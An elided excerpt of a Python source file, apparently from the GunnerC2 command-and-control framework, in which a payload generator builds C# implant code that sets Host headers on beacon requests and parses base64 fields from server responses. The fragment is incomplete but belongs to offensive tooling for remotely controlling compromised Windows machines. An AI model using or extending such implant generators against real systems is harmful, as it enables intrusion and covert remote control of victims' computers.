# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-GunnerC2\core\payload_generator\windows\https\gunnerplant\payload_files.py
import base64
import json
import os
...
def program(ip, port, cfg=None, scheme="https", profile=False):
    ...
    if profile:
        ...
        host_line = (
            f'getReq.Headers.TryAddWithoutValidation("{_cs_escape("Host")}", "{_cs_escape(cfg.host)}");'
            if cfg.host
            else ""
        )
        ...
        host_post = (
            f'postReq.Headers.TryAddWithoutValidation("{_cs_escape("Host")}", "{_cs_escape(cfg.host_post)}");'
            if cfg.host_post
            else ""
        )
        ...
        regexes = [f'"{_cs_escape(k.split(".")[-1])}"\\s*:\\s*"(?<b64>[A-Za-z0-9+/=]+)"' for k in probe_keys]
